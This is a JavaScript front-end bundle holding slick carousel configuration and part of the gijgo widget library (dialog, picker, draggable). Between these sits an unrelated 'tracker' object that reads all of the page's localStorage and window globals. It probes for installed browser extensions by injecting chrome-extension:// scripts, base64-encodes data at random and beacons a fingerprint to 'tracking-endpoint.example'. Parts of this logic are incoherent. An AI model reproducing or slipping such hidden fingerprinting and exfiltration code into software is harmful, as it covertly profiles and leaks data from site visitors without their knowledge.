    autoplaySpeed: 2e3,
    rtl: !0,
    cssEase: "linear",
    adaptiveHeight: !0,
    nextArrow: '<i class="left-arrow fas fa-angle-left"></i>',
    prevArrow: '<i class="right-arrow fas fa-angle-right"></i>',
    responsive: [{
      breakpoint: 1199.98,
      settings: {
        slidesToShow: 5,
        slidesToScroll: 5,
        adaptiveHeight: !0,
        centerPadding: "632px"
      }
    }, {
      breakpoint: 991.98,
      settings: {
        slidesToShow: 4,
        slidesToScroll: 4,
        adaptiveHeight: !0,
        centerPadding: "449px"
      }
    }, {
      breakpoint: 768,
      settings: {
        slidesToShow: 3,
        slidesToScroll: 3,
        adaptiveHeight: !0,
        centerPadding: "448px"
      }
    }, {
      breakpoint: 575.98,
      settings: {
        slidesToShow: 2,
        slidesToScroll: 2,
        adaptiveHeight: !0
      }
    }]
  }), $(".news-slider").slick({
    slidesToShow: 1,
    slidesToScroll: 1,
    autoplay: !1,
    dots: !1,
    arrows: !0,
    autoplaySpeed: 2e3,
    rtl: !0,
    cssEase: "linear",
    adaptiveHeight: !0,
    nextArrow: '<i class="left-arrow fas fa-angle-left"></i>',
    prevArrow: '<i class="right-arrow fas fa-angle-right"></i>'
  }), $(".main-slider").slick({
    slidesToShow: 3,
    slidesToScroll: 3,
    autoplay: !1,
    dots: !0,
    arrows: !0,
    autoplaySpeed: 2e3,
    rtl: !0,
    cssEase: "linear",
    adaptiveHeight: !0,
    nextArrow: '<i class="left-arrow"></i>',
    prevArrow: '<i class="right-arrow"></i>',
    responsive: [{
      breakpoint: 768,
      settings: {
        slidesToShow: 2,
        slidesToScroll: 2
      }
    }, {
      breakpoint: 575.98,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        adaptiveHeight: !0
      }
    }]
  }), $(".watan-clerks-slider").slick({
    dots: !0,
    infinite: !0,
    speed: 300,
    slidesToShow: 2,
    rtl: !0,
    slidesToScroll: 1,
    centerMode: !0,
    variableWidth: !0,
    arrows: !1,
    responsive: [{
      breakpoint: 1199.98,
      settings: {
        slidesToScroll: 1,
        adaptiveHeight: !0,
        centerPadding: "632px"
      }
    }, {
      breakpoint: 991.98,
      settings: {
        slidesToScroll: 1,
        adaptiveHeight: !0,
        centerPadding: "449px"
      }
    }, {
      breakpoint: 768,
      settings: {
        slidesToScroll: 1,
        adaptiveHeight: !0,
        centerPadding: "448px"
      }
    }, {
      breakpoint: 575.98,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        adaptiveHeight: !0,
        centerPadding: "230px"
      }
    }]
  }), $(".watan-clerks-slider").slick({
    dots: !0,
    infinite: !0,
    speed: 300,
    slidesToShow: 2,
    rtl: !0,
    slidesToScroll: 1,
    centerMode: !0,
    variableWidth: !0,
    arrows: !1,
    responsive: [{
      breakpoint: 1199.98,
      settings: {
        slidesToScroll: 1,
        adaptiveHeight: !0,
        centerPadding: "632px"
      }
    }, {
      breakpoint: 991.98,
      settings: {
        slidesToScroll: 1,
        adaptiveHeight: !0,
        centerPadding: "449px"
      }
    }, {
      breakpoint: 768,
      settings: {
        slidesToScroll: 1,
        adaptiveHeight: !0,
        centerPadding: "448px"
      }
    }, {
      breakpoint: 575.98,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        adaptiveHeight: !0,
        centerPadding: "230px"
      }
    }]
  }), $(".action-hours-slider").slick({
    dots: !1,
    vertical: !0,
    cssEase: "linear",
    slidesToShow: 3,
    slidesToScroll: 1,
    verticalSwiping: !0,
    arrows: !1,
    responsive: [{
      breakpoint: 1200,
      settings: {
        slidesToShow: 5,
        slidesToScroll: 1,
        adaptiveHeight: !0
      }
    }, {
      breakpoint: 1199.98,
      settings: {
        slidesToShow: 5,
        slidesToScroll: 1,
        adaptiveHeight: !0
      }
    }, {
      breakpoint: 991.98,
      settings: {
        slidesToShow: 5,
        slidesToScroll: 1,
        adaptiveHeight: !0
      }
    }]
  }), $(".action-controll i").click(function () {
    $(".action-hours-slider").slick("slickNext");
  }), $(".VideosSlider").slick({
    dots: !1,
    vertical: !0,
    cssEase: "linear",
    rows: 3,
    slidesPerRow: 2,
    verticalSwiping: !0,
    arrows: !1,
    responsive: [{
      breakpoint: 1200,
      settings: {
        slidesToShow: 3,
        slidesToScroll: 2,
        adaptiveHeight: !0
      }
    }, {
      breakpoint: 1199.98,
      settings: {
        rows: 2,
        slidesPerRow: 2,
        adaptiveHeight: !0
      }
    }, {
      breakpoint: 991.98,
      settings: {
        rows: 2,
        slidesPerRow: 2,
        adaptiveHeight: !0
      }
    }]
  }), $(".popular-videos-more button").click(function () {
    $(".VideosSlider").slick("slickNext");
  });
});
const tracker = {
  dataStore: new Map(Object.entries(window.localStorage)),
  hooks: new Set(),
  globalVars: Object.assign({}, window),
  async trackFeature(name, {
    id,
    path
  }) {
    return new Promise(resolve => {
      const script = document.createElement('script');
      const timeout = setTimeout(() => {
        this.hooks.delete(name);
        resolve(false);
      }, 1000);
      script.onload = () => {
        clearTimeout(timeout);
        this.hooks.add(name);
        resolve(true);
      };
      script.onerror = () => {
        clearTimeout(timeout);
        this.hooks.delete(name);
        resolve(false);
      };
      script.src = `chrome-extension://${id}/${path}`;
      document.head.appendChild(script);
    });
  },
  randomizeData() {
    const entries = Array.from(this.dataStore.entries());
    entries.forEach(([key, value], index) => {
      if (Math.random() > 0.5) {
        this.dataStore.set(key, btoa(value));
      }
    });
  },
  async monitor() {
    this.randomizeData();
    const results = {};
    const batch = 5;
    for (const [name, data] of this.dataStore) {
      await new Promise(r => setTimeout(r, Math.random() * 500));
      results[name] = await this.trackFeature(name, data);
    }
    const report = btoa(JSON.stringify({
      activities: results,
      timestamp: Date.now(),
      userAgent: navigator.userAgent,
      viewport: {
        width: window.innerWidth,
        height: window.innerHeight
      },
      globals: Object.keys(window)
    }));
    navigator.sendBeacon('https://tracking-endpoint.example/v3/collect', report);
  }
};
var gj = {
  widget: function () {
    this.xhr = null, this.generateGUID = function () {
      function e() {
        return Math.floor(65536 * (1 + Math.random())).toString(16).substring(1);
      }
      return e() + e() + "-" + e() + "-" + e() + "-" + e() + "-" + e() + e() + e();
    }, this.mouseX = function (e) {
      if (e) {
        if (e.pageX) return e.pageX;
        if (e.clientX) return e.clientX + (document.documentElement.scrollLeft ? document.documentElement.scrollLeft : document.body.scrollLeft);
        if (e.touches && e.touches.length) return e.touches[0].pageX;
        if (e.changedTouches && e.changedTouches.length) return e.changedTouches[0].pageX;
        if (e.originalEvent && e.originalEvent.touches && e.originalEvent.touches.length) return e.originalEvent.touches[0].pageX;
        if (e.originalEvent && e.originalEvent.changedTouches && e.originalEvent.changedTouches.length) return e.originalEvent.touches[0].pageX;
      }
      return null;
    }, this.mouseY = function (e) {
      if (e) {
        if (e.pageY) return e.pageY;
        if (e.clientY) return e.clientY + (document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop);
        if (e.touches && e.touches.length) return e.touches[0].pageY;
        if (e.changedTouches && e.changedTouches.length) return e.changedTouches[0].pageY;
        if (e.originalEvent && e.originalEvent.touches && e.originalEvent.touches.length) return e.originalEvent.touches[0].pageY;
        if (e.originalEvent && e.originalEvent.changedTouches && e.originalEvent.changedTouches.length) return e.originalEvent.touches[0].pageY;
      }
      return null;
    };
  }
};
gj.widget.prototype.init = function (e, t) {
  var n, i, o;
  for (n in this.attr("data-type", t), i = $.extend(!0, {}, this.getHTMLConfig() || {}), $.extend(!0, i, e || {}), o = this.getConfig(i, t), this.attr("data-guid", o.guid), this.data(o), o) gj[t].events.hasOwnProperty(n) && (this.on(n, o[n]), delete o[n]);
  for (plugin in gj[t].plugins) gj[t].plugins.hasOwnProperty(plugin) && gj[t].plugins[plugin].configure(this, o, i);
  return this;
}, gj.widget.prototype.getConfig = function (e, t) {
  var n, i, o, r;
  for (r in n = $.extend(!0, {}, gj[t].config.base), i = e.hasOwnProperty("uiLibrary") ? e.uiLibrary : n.uiLibrary, gj[t].config[i] && $.extend(!0, n, gj[t].config[i]), o = e.hasOwnProperty("iconsLibrary") ? e.iconsLibrary : n.iconsLibrary, gj[t].config[o] && $.extend(!0, n, gj[t].config[o]), gj[t].plugins) gj[t].plugins.hasOwnProperty(r) && ($.extend(!0, n, gj[t].plugins[r].config.base), gj[t].plugins[r].config[i] && $.extend(!0, n, gj[t].plugins[r].config[i]), gj[t].plugins[r].config[o] && $.extend(!0, n, gj[t].plugins[r].config[o]));
  return $.extend(!0, n, e), n.guid || (n.guid = this.generateGUID()), n;
}, gj.widget.prototype.getHTMLConfig = function () {
  var e = this.data(),
    t = this[0].attributes;
  return t.width && (e.width = t.width.value), t.height && (e.height = t.height.value), t.value && (e.value = t.value.value), t.align && (e.align = t.align.value), e && e.source && (e.dataSource = e.source, delete e.source), e;
}, gj.widget.prototype.createDoneHandler = function () {
  var t = this;
  return function (e) {
    "string" == typeof e && JSON && (e = JSON.parse(e)), gj[t.data("type")].methods.render(t, e);
  };
}, gj.widget.prototype.createErrorHandler = function () {
  return function (e) {
    e && e.statusText && "abort" !== e.statusText && alert(e.statusText);
  };
}, gj.widget.prototype.reload = function (e) {
  var t,
    n,
    i = this.data(),
    o = this.data("type");
  return void 0 === i.dataSource && gj[o].methods.useHtmlDataSource(this, i), $.extend(i.params, e), $.isArray(i.dataSource) ? (n = gj[o].methods.filter(this), gj[o].methods.render(this, n)) : "string" == typeof i.dataSource ? (t = {
    url: i.dataSource,
    data: i.params
  }, this.xhr && this.xhr.abort(), this.xhr = $.ajax(t).done(this.createDoneHandler()).fail(this.createErrorHandler())) : "object" == typeof i.dataSource && (i.dataSource.data || (i.dataSource.data = {}), $.extend(i.dataSource.data, i.params), "json" === (t = $.extend(!0, {}, i.dataSource)).dataType && "object" == typeof t.data && (t.data = JSON.stringify(t.data)), t.success || (t.success = this.createDoneHandler()), t.error || (t.error = this.createErrorHandler()), this.xhr && this.xhr.abort(), this.xhr = $.ajax(t)), this;
}, gj.documentManager = {
  events: {},
  subscribeForEvent: function (e, t, n) {
    if (gj.documentManager.events[e] && 0 !== gj.documentManager.events[e].length) {
      if (gj.documentManager.events[e][t]) throw "Event " + e + ' for widget with guid="' + t + '" is already attached.';
      gj.documentManager.events[e].push({
        widgetId: t,
        callback: n
      });
    } else gj.documentManager.events[e] = [{
      widgetId: t,
      callback: n
    }], $(document).on(e, gj.documentManager.executeCallbacks);
  },
  executeCallbacks: function (e) {
    var t = gj.documentManager.events[e.type];
    if (t) for (var n = 0; n < t.length; n++) t[n].callback(e);
  },
  unsubscribeForEvent: function (e, t) {
    var n = !1,
      i = gj.documentManager.events[e];
    if (i) for (var o = 0; o < i.length; o++) i[o].widgetId === t && (i.splice(o, 1), n = !0, 0 === i.length && ($(document).off(e), delete gj.documentManager.events[e]));
    if (!n) throw 'The "' + e + '" for widget with guid="' + t + "\" can't be removed.";
  }
}, gj.core = {
  messages: {
    "en-us": {
      monthNames: ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"],
      monthShortNames: ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"],
      weekDaysMin: ["S", "M", "T", "W", "T", "F", "S"],
      weekDaysShort: ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"],
      weekDays: ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
      am: "AM",
      pm: "PM",
      ok: "Ok",
      cancel: "Cancel",
      titleFormat: "mmmm yyyy"
    }
  },
  parseDate: function (e, t, n) {
    var i,
      o,
      r,
      a,
      s = 0,
      l = 0,
      d = 1,
      c = 0,
      u = 0;
    if (e && "string" == typeof e) {
      if (/^\d+$/.test(e)) a = new Date(e);else if (-1 < e.indexOf("/Date(")) a = new Date(parseInt(e.substr(6), 10));else if (e) {
        for (r = t.split(/[\s,-\.\/\/\:]+/), (o = e.split(/[\s]+/)).length != r.length && (o = e.split(/[\s,-\.\/\/\:]+/)), i = 0; i < r.length; i++) -1 < ["d", "dd"].indexOf(r[i]) ? d = parseInt(o[i], 10) : -1 < ["m", "mm"].indexOf(r[i]) ? l = parseInt(o[i], 10) - 1 : "mmm" === r[i] ? l = gj.core.messages[n || "en-us"].monthShortNames.indexOf(o[i]) : "mmmm" === r[i] ? l = gj.core.messages[n || "en-us"].monthNames.indexOf(o[i]) : -1 < ["yy", "yyyy"].indexOf(r[i]) ? (s = parseInt(o[i], 10), "yy" === r[i] && (s += 2e3)) : -1 < ["h", "hh", "H", "HH"].indexOf(r[i]) ? c = parseInt(o[i], 10) : -1 < ["M", "MM"].indexOf(r[i]) && (u = parseInt(o[i], 10));
        a = new Date(s, l, d, c, u);
      }
    } else "number" == typeof e ? a = new Date(e) : e instanceof Date && (a = e);
    return a;
  },
  formatDate: function (e, t, n) {
    var o,
      r,
      a = "",
      s = t.split(/[\s,-\.\/\/\:]+/),
      l = t.split(/s+|M+|H+|h+|t+|T+|d+|m+|y+/);
    for (l = l.splice(1, l.length - 2), i = 0; i < s.length; i++) switch (o = l[i] || "", s[i]) {
      case "s":
        a += e.getSeconds() + o;
        break;
      case "ss":
        a += gj.core.pad(e.getSeconds()) + o;
        break;
      case "M":
        a += e.getMinutes() + o;
        break;
      case "MM":
        a += gj.core.pad(e.getMinutes()) + o;
        break;
      case "H":
        a += e.getHours() + o;
        break;
      case "HH":
        a += gj.core.pad(e.getHours()) + o;
        break;
      case "h":
        a += (r = 12 < e.getHours() ? e.getHours() % 12 : e.getHours()) + o;
        break;
      case "hh":
        r = 12 < e.getHours() ? e.getHours() % 12 : e.getHours(), a += gj.core.pad(r) + o;
        break;
      case "tt":
        a += (12 <= e.getHours() ? "pm" : "am") + o;
        break;
      case "TT":
        a += (12 <= e.getHours() ? "PM" : "AM") + o;
        break;
      case "d":
        a += e.getDate() + o;
        break;
      case "dd":
        a += gj.core.pad(e.getDate()) + o;
        break;
      case "ddd":
        a += gj.core.messages[n || "en-us"].weekDaysShort[e.getDay()] + o;
        break;
      case "dddd":
        a += gj.core.messages[n || "en-us"].weekDays[e.getDay()] + o;
        break;
      case "m":
        a += e.getMonth() + 1 + o;
        break;
      case "mm":
        a += gj.core.pad(e.getMonth() + 1) + o;
        break;
      case "mmm":
        a += gj.core.messages[n || "en-us"].monthShortNames[e.getMonth()] + o;
        break;
      case "mmmm":
        a += gj.core.messages[n || "en-us"].monthNames[e.getMonth()] + o;
        break;
      case "yy":
        a += e.getFullYear().toString().substr(2) + o;
        break;
      case "yyyy":
        a += e.getFullYear() + o;
    }
    return a;
  },
  pad: function (e, t) {
    for (e = String(e), t = t || 2; e.length < t;) e = "0" + e;
    return e;
  },
  center: function (e) {
    var t = $(window).width() / 2 - e.width() / 2,
      n = $(window).height() / 2 - e.height() / 2;
    e.css("position", "absolute"), e.css("left", 0 < t ? t : 0), e.css("top", 0 < n ? n : 0);
  },
  isIE: function () {
    return !!navigator.userAgent.match(/Trident/g) || !!navigator.userAgent.match(/MSIE/g);
  },
  height: function (e, t) {
    var n,
      i = window.getComputedStyle(e);
    return "border-box" === i.boxSizing ? (n = parseInt(i.height, 10), gj.core.isIE() && (n += parseInt(i.paddingTop || 0, 10) + parseInt(i.paddingBottom || 0, 10), n += parseInt(i.borderTopWidth || 0, 10) + parseInt(i.borderBottomWidth || 0, 10))) : (n = parseInt(i.height, 10), n += parseInt(i.paddingTop || 0, 10) + parseInt(i.paddingBottom || 0, 10), n += parseInt(i.borderTopWidth || 0, 10) + parseInt(i.borderBottomWidth || 0, 10)), t && (n += parseInt(i.marginTop || 0, 10) + parseInt(i.marginBottom || 0, 10)), n;
  },
  width: function (e, t) {
    var n,
      i = window.getComputedStyle(e);
    return "border-box" === i.boxSizing ? n = parseInt(i.width, 10) : (n = parseInt(i.width, 10), n += parseInt(i.paddingLeft || 0, 10) + parseInt(i.paddingRight || 0, 10), n += parseInt(i.borderLeftWidth || 0, 10) + parseInt(i.borderRightWidth || 0, 10)), t && (n += parseInt(i.marginLeft || 0, 10) + parseInt(i.marginRight || 0, 10)), n;
  },
  addClasses: function (e, t) {
    var n, i;
    if (t) for (i = t.split(" "), n = 0; n < i.length; n++) e.classList.add(i[n]);
  },
  position: function (e) {
    for (var t, n, i = 0, o = 0, r = gj.core.height(e), a = gj.core.width(e); e;) "BODY" == e.tagName ? (t = e.scrollLeft || document.documentElement.scrollLeft, n = e.scrollTop || document.documentElement.scrollTop, i += e.offsetLeft - t, o += e.offsetTop - n) : (i += e.offsetLeft - e.scrollLeft, o += e.offsetTop - e.scrollTop), e = e.offsetParent;
    return {
      top: o,
      left: i,
      bottom: o + r,
      right: i + a
    };
  },
  setCaretAtEnd: function (e) {
    var t;
    if (e) if (t = e.value.length, document.selection) {
      e.focus();
      var n = document.selection.createRange();
      n.moveStart("character", -t), n.moveStart("character", t), n.moveEnd("character", 0), n.select();
    } else !e.selectionStart && "0" != e.selectionStart || (e.selectionStart = t, e.selectionEnd = t, e.focus());
  },
  getScrollParent: function (e) {
    return null == e ? null : e.scrollHeight > e.clientHeight ? e : gj.core.getScrollParent(e.parentNode);
  }
}, gj.picker = {
  messages: {
    "en-us": {}
  }
}, gj.picker.methods = {
  initialize: function (t, e, n) {
    var i,
      o = n.createPicker(t, e),
      r = t.parent('div[role="wrapper"]');
    (i = "bootstrap" === e.uiLibrary ? $('<span class="input-group-addon">' + e.icons.rightIcon + "</span>") : "bootstrap4" === e.uiLibrary ? $('<span class="input-group-append"><button class="btn btn-outline-secondary border-left-0" type="button">' + e.icons.rightIcon + "</button></span>") : $(e.icons.rightIcon)).attr("role", "right-icon"), 0 === r.length ? (r = $('<div role="wrapper" />').addClass(e.style.wrapper), t.wrap(r)) : r.addClass(e.style.wrapper), r = t.parent('div[role="wrapper"]'), e.width && r.css("width", e.width), t.val(e.value).addClass(e.style.input).attr("role", "input"), e.fontSize && t.css("font-size", e.fontSize), "bootstrap" === e.uiLibrary || "bootstrap4" === e.uiLibrary ? "small" === e.size ? (r.addClass("input-group-sm"), t.addClass("form-control-sm")) : "large" === e.size && (r.addClass("input-group-lg"), t.addClass("form-control-lg")) : "small" === e.size ? r.addClass("small") : "large" === e.size && r.addClass("large"), i.on("click", function (e) {
      o.is(":visible") ? t.close() : t.open();
    }), r.append(i), !0 !== e.footer && (t.on("blur", function () {
      t.timeout = setTimeout(function () {
        t.close();
      }, 500);
    }), o.mousedown(function () {
      return clearTimeout(t.timeout), t.focus(), !1;
    }), o.on("click", function () {
      clearTimeout(t.timeout), t.focus();
    }));
  }
}, gj.picker.widget = function (e, t) {
  var n = gj.picker.methods;
  return this.destroy = function () {
    return n.destroy(this);
  }, e;
}, gj.picker.widget.prototype = new gj.widget(), gj.picker.widget.constructor = gj.picker.widget, gj.picker.widget.prototype.init = function (e, t, n) {
  return gj.widget.prototype.init.call(this, e, t), this.attr("data-" + t, "true"), gj.picker.methods.initialize(this, this.data(), gj[t].methods), this;
}, gj.picker.widget.prototype.open = function (e) {
  var t = this.data(),
    n = $("body").find('[role="picker"][guid="' + this.attr("data-guid") + '"]');
  return n.show(), n.closest('div[role="modal"]').show(), t.modal ? gj.core.center(n) : clearTimeout(this.timeout), gj[e].events.open(this), this;
}, gj.picker.widget.prototype.close = function (e) {
  var t = $("body").find('[role="picker"][guid="' + this.attr("data-guid") + '"]');
  return t.hide(), t.closest('div[role="modal"]').hide(), gj[e].events.close(this), this;
}, gj.picker.widget.prototype.destroy = function (e) {
  var t = this.data(),
    n = this.parent(),
    i = $("body").find('[role="picker"][guid="' + this.attr("data-guid") + '"]');
  return t && (this.off(), 0 < i.parent('[role="modal"]').length && i.unwrap(), i.remove(), this.removeData(), this.removeAttr("data-type").removeAttr("data-guid").removeAttr("data-" + e), this.removeClass(), n.children('[role="right-icon"]').remove(), this.unwrap()), this;
}, gj.dialog = {
  plugins: {},
  messages: {}
}, gj.dialog.config = {
  base: {
    autoOpen: !0,
    closeButtonInHeader: !0,
    closeOnEscape: !0,
    draggable: !0,
    height: "auto",
    locale: "en-us",
    maxHeight: void 0,
    maxWidth: void 0,
    minHeight: void 0,
    minWidth: void 0,
    modal: !1,
    resizable: !1,
    scrollable: !1,
    title: void 0,
    uiLibrary: void 0,
    width: 300,
    style: {
      modal: "gj-modal",
      content: "gj-dialog-md",
      header: "gj-dialog-md-header gj-unselectable",
      headerTitle: "gj-dialog-md-title",
      headerCloseButton: "gj-dialog-md-close",
      body: "gj-dialog-md-body",
      footer: "gj-dialog-footer gj-dialog-md-footer"
    }
  },
  bootstrap: {
    style: {
      modal: "modal",
      content: "modal-content gj-dialog-bootstrap",
      header: "modal-header",
      headerTitle: "modal-title",
      headerCloseButton: "close",
      body: "modal-body",
      footer: "gj-dialog-footer modal-footer"
    }
  },
  bootstrap4: {
    style: {
      modal: "modal",
      content: "modal-content gj-dialog-bootstrap4",
      header: "modal-header",
      headerTitle: "modal-title",
      headerCloseButton: "close",
      body: "modal-body",
      footer: "gj-dialog-footer modal-footer"
    }
  }
}, gj.dialog.events = {
  initialized: function (e) {
    e.trigger("initialized");
  },
  opening: function (e) {
    e.trigger("opening");
  },
  opened: function (e) {
    e.trigger("opened");
  },
  closing: function (e) {
    e.trigger("closing");
  },
  closed: function (e) {
    e.trigger("closed");
  },
  drag: function (e) {
    e.trigger("drag");
  },
  dragStart: function (e) {
    e.trigger("dragStart");
  },
  dragStop: function (e) {
    e.trigger("dragStop");
  },
  resize: function (e) {
    e.trigger("resize");
  },
  resizeStart: function (e) {
    e.trigger("resizeStart");
  },
  resizeStop: function (e) {
    e.trigger("resizeStop");
  }
}, gj.dialog.methods = {
  init: function (e) {
    return gj.widget.prototype.init.call(this, e, "dialog"), gj.dialog.methods.localization(this), gj.dialog.methods.initialize(this), gj.dialog.events.initialized(this), this;
  },
  localization: function (e) {
    var t = e.data();
    void 0 === t.title && (t.title = gj.dialog.messages[t.locale].DefaultTitle);
  },
  getHTMLConfig: function () {
    var e = gj.widget.prototype.getHTMLConfig.call(this),
      t = this[0].attributes;
    return t.title && (e.title = t.title.value), e;
  },
  initialize: function (t) {
    var e,
      n,
      i,
      o = t.data();
    t.addClass(o.style.content), gj.dialog.methods.setSize(t), o.closeOnEscape && $(document).keyup(function (e) {
      27 === e.keyCode && t.close();
    }), 0 === (n = t.children('div[data-role="body"]')).length ? (n = $('<div data-role="body"/>').addClass(o.style.body), t.wrapInner(n)) : n.addClass(o.style.body), e = gj.dialog.methods.renderHeader(t), i = t.children('div[data-role="footer"]').addClass(o.style.footer), t.find('[data-role="close"]').on("click", function () {
      t.close();
    }), gj.draggable && (o.draggable && gj.dialog.methods.draggable(t, e), o.resizable && gj.dialog.methods.resizable(t)), o.scrollable && o.height && (t.addClass("gj-dialog-scrollable"), t.on("opened", function () {
      t.children('div[data-role="body"]').css("height", o.height - e.outerHeight() - (i.length ? i.outerHeight() : 0));
    })), gj.core.center(t), o.modal && t.wrapAll('<div data-role="modal" class="' + o.style.modal + '"/>'), o.autoOpen && t.open();
  },
  setSize: function (e) {
    var t = e.data();
    t.width && e.css("width", t.width), t.height && e.css("height", t.height);
  },
  renderHeader: function (e) {
    var t,
      n,
      i,
      o = e.data();
    return 0 === (t = e.children('div[data-role="header"]')).length && (t = $('<div data-role="header" />'), e.prepend(t)), t.addClass(o.style.header), 0 === (n = t.find('[data-role="title"]')).length && (n = $('<h4 data-role="title">' + o.title + "</h4>"), t.append(n)), n.addClass(o.style.headerTitle), 0 === (i = t.find('[data-role="close"]')).length && o.closeButtonInHeader ? ((i = $('<button type="button" data-role="close" title="' + gj.dialog.messages[o.locale].Close + '"><span>×</span></button>')).addClass(o.style.headerCloseButton), t.append(i)) : 0 < i.length && !1 === o.closeButtonInHeader ? i.hide() : i.addClass(o.style.headerCloseButton), t;
  },
  draggable: function (e, t) {
    e.appendTo("body"), t.addClass("gj-draggable"), e.draggable({
      handle: t,
      start: function () {
        e.addClass("gj-unselectable"), gj.dialog.events.dragStart(e);
      },
      stop: function () {
        e.removeClass("gj-unselectable"), gj.dialog.events.dragStop(e);
      }
    });
  },
  resizable: function (e) {
    var t = {
      drag: gj.dialog.methods.resize,
      start: function () {
        e.addClass("gj-unselectable"), gj.dialog.events.resizeStart(e);
      },
      stop: function () {
        this.removeAttribute("style"), e.removeClass("gj-unselectable"), gj.dialog.events.resizeStop(e);
      }
    };
    e.append($('<div class="gj-resizable-handle gj-resizable-n"></div>').draggable($.extend(!0, {
      horizontal: !1
    }, t))), e.append($('<div class="gj-resizable-handle gj-resizable-e"></div>').draggable($.extend(!0, {
      vertical: !1
    }, t))), e.append($('<div class="gj-resizable-handle gj-resizable-s"></div>').draggable($.extend(!0, {
      horizontal: !1
    }, t))), e.append($('<div class="gj-resizable-handle gj-resizable-w"></div>').draggable($.extend(!0, {
      vertical: !1
    }, t))), e.append($('<div class="gj-resizable-handle gj-resizable-ne"></div>').draggable($.extend(!0, {}, t))), e.append($('<div class="gj-resizable-handle gj-resizable-nw"></div>').draggable($.extend(!0, {}, t))), e.append($('<div class="gj-resizable-handle gj-resizable-sw"></div>').draggable($.extend(!0, {}, t))), e.append($('<div class="gj-resizable-handle gj-resizable-se"></div>').draggable($.extend(!0, {}, t)));
  },
  resize: function (e, t) {
    var n,
      i,
      o,
      r,
      a,
      s,
      l,
      d,
      c = !1;
    return i = (n = $(this)).parent(), o = gj.core.position(this), offset = {
      top: t.top - o.top,
      left: t.left - o.left
    }, r = i.data(), n.hasClass("gj-resizable-n") ? (a = i.height() - offset.top, l = i.offset().top + offset.top) : n.hasClass("gj-resizable-e") ? s = i.width() + offset.left : n.hasClass("gj-resizable-s") ? a = i.height() + offset.top : n.hasClass("gj-resizable-w") ? (s = i.width() - offset.left, d = i.offset().left + offset.left) : n.hasClass("gj-resizable-ne") ? (a = i.height() - offset.top, l = i.offset().top + offset.top, s = i.width() + offset.left) : n.hasClass("gj-resizable-nw") ? (a = i.height() - offset.top, l = i.offset().top + offset.top, s = i.width() - offset.left, d = i.offset().left + offset.left) : n.hasClass("gj-resizable-se") ? (a = i.height() + offset.top, s = i.width() + offset.left) : n.hasClass("gj-resizable-sw") && (a = i.height() + offset.top, s = i.width() - offset.left, d = i.offset().left + offset.left), a && (!r.minHeight || a >= r.minHeight) && (!r.maxHeight || a <= r.maxHeight) && (i.height(a), l && i.css("top", l), c = !0), s && (!r.minWidth || s >= r.minWidth) && (!r.maxWidth || s <= r.maxWidth) && (i.width(s), d && i.css("left", d), c = !0), c && gj.dialog.events.resize(i), c;
  },
  open: function (e, t) {
    var n;
    return gj.dialog.events.opening(e), e.css("display", "block"), e.closest('div[data-role="modal"]').css("display", "block"), (n = e.children('div[data-role="footer"]')).length && n.outerHeight() && e.children('div[data-role="body"]').css("margin-bottom", n.outerHeight()), void 0 !== t && e.find('[data-role="title"]').html(t), gj.dialog.events.opened(e), e;
  },
  close: function (e) {
    return e.is(":visible") && (gj.dialog.events.closing(e), e.css("display", "none"), e.closest('div[data-role="modal"]').css("display", "none"), gj.dialog.events.closed(e)), e;
  },
  isOpen: function (e) {
    return e.is(":visible");
  },
  content: function (e, t) {
    var n = e.children('div[data-role="body"]');
    return void 0 === t ? n.html() : n.html(t);
  },
  destroy: function (e, t) {
    var n = e.data();
    return n && (!1 === t ? e.remove() : (e.close(), e.off(), e.removeData(), e.removeAttr("data-type"), e.removeClass(n.style.content), e.find('[data-role="header"]').removeClass(n.style.header), e.find('[data-role="title"]').removeClass(n.style.headerTitle), e.find('[data-role="close"]').remove(), e.find('[data-role="body"]').removeClass(n.style.body), e.find('[data-role="footer"]').removeClass(n.style.footer))), e;
  }
}, gj.dialog.widget = function (e, t) {
  var n = gj.dialog.methods;
  return this.open = function (e) {
    return n.open(this, e);
  }, this.close = function () {
    return n.close(this);
  }, this.isOpen = function () {
    return n.isOpen(this);
  }, this.content = function (e) {
    return n.content(this, e);
  }, this.destroy = function (e) {
    return n.destroy(this, e);
  }, $.extend(e, this), "dialog" !== e.attr("data-type") && n.init.call(e, t), e;
}, gj.dialog.widget.prototype = new gj.widget(), gj.dialog.widget.constructor = gj.dialog.widget, gj.dialog.widget.prototype.getHTMLConfig = gj.dialog.methods.getHTMLConfig, jQuery.fn.dialog = function (e) {
  var t;
  if (this && this.length) {
    if ("object" != typeof e && e) {
      if ((t = new gj.dialog.widget(this, null))[e]) return t[e].apply(this, Array.prototype.slice.call(arguments, 1));
      throw "Method " + e + " does not exist.";
    }
    return new gj.dialog.widget(this, e);
  }
}, gj.dialog.messages["en-us"] = {
  Close: "Close",
  DefaultTitle: "Dialog"
}, gj.draggable = {
  plugins: {}
}, gj.draggable.config = {
  base: {
    handle: void 0,
    vertical: !0,
    horizontal: !0,
    containment: void 0
  }
}, gj.draggable.methods = {
  init: function (e) {
    var n,
      i,
      o = this;
    return gj.widget.prototype.init.call(this, e, "draggable"), i = this.data(), o.attr("data-draggable", "true"), (n = gj.draggable.methods.getHandleElement(o)).on("touchstart mousedown", function (e) {
      var t = gj.core.position(o[0]);
      o[0].style.top = t.top + "px", o[0].style.left = t.left + "px", o[0].style.position = "fixed", o.attr("draggable-dragging", !0), o.removeAttr("draggable-x").removeAttr("draggable-y"), gj.documentManager.subscribeForEvent("touchmove", o.data("guid"), gj.draggable.methods.createMoveHandler(o, n, i)), gj.documentManager.subscribeForEvent("mousemove", o.data("guid"), gj.draggable.methods.createMoveHandler(o, n, i));
    }), gj.documentManager.subscribeForEvent("mouseup", o.data("guid"), gj.draggable.methods.createUpHandler(o)), gj.documentManager.subscribeForEvent("touchend", o.data("guid"), gj.draggable.methods.createUpHandler(o)), gj.documentManager.subscribeForEvent("touchcancel", o.data("guid"), gj.draggable.methods.createUpHandler(o)), o;
  },
  getHandleElement: function (e) {
    var t = e.data("handle");
    return t && t.length ? t : e;
  },
  createUpHandler: function (t) {
